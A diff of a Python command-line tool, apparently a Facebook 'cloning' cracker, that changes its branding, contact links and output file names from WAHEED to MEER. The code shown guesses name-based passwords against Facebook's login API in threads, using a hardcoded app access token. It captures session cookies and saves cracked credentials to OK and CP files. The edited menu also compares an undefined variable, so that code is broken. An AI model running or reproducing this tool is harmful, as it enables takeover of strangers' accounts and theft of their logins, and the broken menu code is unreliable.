@@ -234,23 +234,27 @@ syed =[
 
 ]
 logo=(f"""
-\033[97;1m. __  __          ______ _____          
- |  \/  |   /\   |  ____|_   _|   /\    
- | \  / |  /  \  | |__    | |    /  \   
- | |\/| | / /\ \ |  __|   | |   / /\ \  
- | |  | |/ ____ \| |     _| |_ / ____ \ 
- |_|  |_/_/    \_\_|    |_____/_/    \_\
+\033[97;1m. 
+  __  __ ______ ______ _____  
+ |  \/  |  ____|  ____|  __ \ 
+ | \  / | |__  | |__  | |__) |
+ | |\/| |  __| |  __| |  _  / 
+ | |  | | |____| |____| | \ \ 
+ |_|  |_|______|______|_|  \_\
+                              
+                              
+
 
 \033[1;37m══════════════════════════════════════════
-\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMAFIA-MEER
-\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m BILAL AHMAD
-\033[1;32m  •   \033[1;35mGITHUB      :  \033[1;35mBILAL-ALISHBA-YASEEN-MUZAMMIL
-\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m5.9
+\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMEER
+\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m MEER-HADI
+\033[1;32m  •   \033[1;35mGITHUB      :  \033[1;35mMEER
+\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m1
 \033[1;37m══════════════════════════════════════════\n""")
 os.system ('clear')
 
 print("\033[1;32m[•] \033[1;33mFOLLOW MY FACEBOOK ID....!");time.sleep(0)
-#os.system('\xdg-open https://www.facebook.com/BILAL.AHMAD.404)
+#os.system('\xdg-open https://www.facebook.com/rizwan.q.1297)
 def clear ():
 	os.system('clear')
 	print (logo)
@@ -290,19 +294,19 @@ def Main():
 	linex()
 	print('\033[1;37m[\033[1;32m1\033[1;37m] File Cloning\n[\033[1;32m2\033[1;37m] Random Number Cloning  \n[\033[1;32m3\033[1;37m] Random Email Cloning \n[\033[1;32m5\033[1;37m] Random Cloning  \033[1;32m>>>\033[1;37m {2009-12} \n\033[1;37m[\033[1;32m6\033[1;37m] \033[1;33mContact Admin \n\033[1;37m[\033[1;32m0\033[1;37m] \033[1;31mExit Programming');linex()
 	WAHEED = input('\033[1;37m[•] Choose : ')
-	if WAHEED =='2':
+	if  MEER =='2':
 		R()
-	if WAHEED =='3':
+	if MEER =='3':
 		eml()
-	if WAHEED =='5':
+	if MEER =='5':
 		os.system('xdg-open https://www.facebook.com/BILAL.AHMAD.404?mibextid=ZbWKwL')
 		Random()
-	if WAHEED =='1':
+	if MEER =='1':
 		men()
-	if WAHEED =='5':
+	if MEER =='5':
 		c()
 	if WAHEED =='0':
-		os.system('xdg-open https://www.facebook.com/BILAL.AHMAD.404?mibextid=ZbWKwL')
+		os.system('xdg-open https://www.facebook.com/rizwan.q.1297?mibextid=ZbWKwL')
 		exit('\033[1;37m(•)══════════════════════════════════════════\n\033[1;32m[•] \033[1;37mThanks For Use\n\033[1;32m[•] \033[1;37mSee You Again ')
 	else:
 		print('\n\033[1;37m(•)══════════════════════════════════════════');time.sleep(2);exit()
@@ -316,11 +320,11 @@ def c():
 	print('\033[1;37m(•)══════════════════════════════════════════')
 	ok = input('\033[1;32mCHOOSE : \033[1;37m')
 	if ok =='1':
-		os.system("xdg-open https://wa.me/+923203715635");Main()
+		os.system("xdg-open https://wa.me/+923074311815");Main()
 	if ok =='2':
-		os.system("xdg-open https://www.facebook.com/BILAL.AHMAD.404?mibextid=ZbWKwL");Main()
+		os.system("xdg-open https://www.facebook.com/rizwan.q.1297??mibextid=ZbWKwL");Main()
 	if ok =='3':
-		print("\033[0;97m USER NAME :\033[0;92m  rajpoot._.080 ")
+		print("\033[0;97m USER NAME :\033[0;92m  MEER._.080 ")
 		input(" PRESS ENTER TO BACK ");Main()
 	if ok =='0':
 		Main()
@@ -372,7 +376,7 @@ def eml():
     user=[]
     os.system('clear')
     print(logo)
-    print("[•] FIRST NAME EXAMPLE : rajpoot,baloch...etc \n[•] LAST NAME EXAMPLE : WAHEED,zoya...etc");linex()
+    print("[•] FIRST NAME EXAMPLE : rajpoot,baloch...etc \n[•] LAST NAME EXAMPLE : MEER,zoya...etc");linex()
     kode = input('[?] ENTER FIRST NAME : ')
     kodex = input('[?] ENTER LAST NAME :  ');linex();clear()
     print('\t%sCRACK WHICH GMAIL '%G);linex()
@@ -393,7 +397,7 @@ def eml():
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
-    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/WAHEED-OK.txt\n[•] CP IDS SAVE : /sdcard/WAHEED-CP.txt');input('[•] Press Enter To Back Menu ');Main()
+    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/MEER-OK.txt\n[•] CP IDS SAVE : /sdcard/MEER-CP.txt');input('[•] Press Enter To Back Menu ');Main()
    
 
 
@@ -454,8 +458,8 @@ class Random:
                 print('\033[1;37m(•)══════════════════════════════════════════')
                 for user in self.id:
                     coeg.submit(self.api, user, listpass.split(","))
-            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> WAHEED-OK.txt" % (G))
-            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> WAHEED-CP.txt" % (Y))
+            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> MEER-OK.txt" % (G))
+            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> MEER-CP.txt" % (Y))
             print('\n\033[1;37m(•)══════════════════════════════════════════')
             input("\n\033[0;92m[√]\033[0;97m CRACK COMPLETE...\n\033[0;92m[~] \033[0;97mPRESS ENTER TO BACK MAIN MENU");Main()
         except Exception as e:
@@ -489,9 +493,9 @@ class Random:
                     pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                 headers=headers)
             if "www.facebook.com" in response.json()["error_msg"]:
-                print("\r \033[0;92m[WAHEED-OK] %s √ %s\033[0;97m         " % (uid, pw))
+                print("\r \033[0;92m[MEER-OK] %s √ %s\033[0;97m         " % (uid, pw))
                 self.cp.append("%s√%s" % (uid, pw))
-                open("WAHEED-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
+                open("MEER-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
                 break
             else:
                 continue
@@ -545,17 +549,17 @@ def rcrack1(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\33[1;92m[WAHEED-OK] '+uid+' √ '+ps+'\33[0;97m')
+				print('\33[1;92m[MEER-OK] '+uid+' √ '+ps+'\33[0;97m')
 				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))
 				
-				open('WAHEED-OK.txt', 'a').write(uid+' √ '+ps+'\n')
+				open('MEER-OK.txt', 'a').write(uid+' √ '+ps+'\n')
 				oks.append(uid);
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
-				print('\33[1;91m[WAHEED-CP] '+uid+' • '+ps+'\33[0;97m')
-				open('WAHEED-CP.txt', 'a').write(uid+' • '+ps+'\n')
+				print('\33[1;91m[MEER-CP] '+uid+' • '+ps+'\33[0;97m')
+				open('MEER-CP.txt', 'a').write(uid+' • '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -575,7 +579,7 @@ def rcrack1(uid,pwx,tl):
 
 def file():
 		clear()
-		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/WAHEED.txt");linex()
+		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MEER.txt");linex()
 		file = input(f'\033[1;32m[?]\033[1;37m PUT FILE PATH : ')
 		try:
 			fo = open(file,'r').read().splitlines()
@@ -619,14 +623,14 @@ def file():
 
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m[WAHEED] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m[MEER] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
                 try:
                         last = names.split(f' ')[1]
                 except:
-                        last = 'Ahmed'
+                        last = 'MEER'
                 ps = first.lower()
                 ps2 = last.lower()
                 for fikr in passlist:
@@ -647,8 +651,8 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in cp:
-                                        print(f'\r\r\033[1;37m[WAHEED-CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/WAHEED-CP.txt', 'a').write(ids+' • '+pas+'\n')
+                                        print(f'\r\r\033[1;37m[MEER-CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MEER-CP.txt', 'a').write(ids+' • '+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
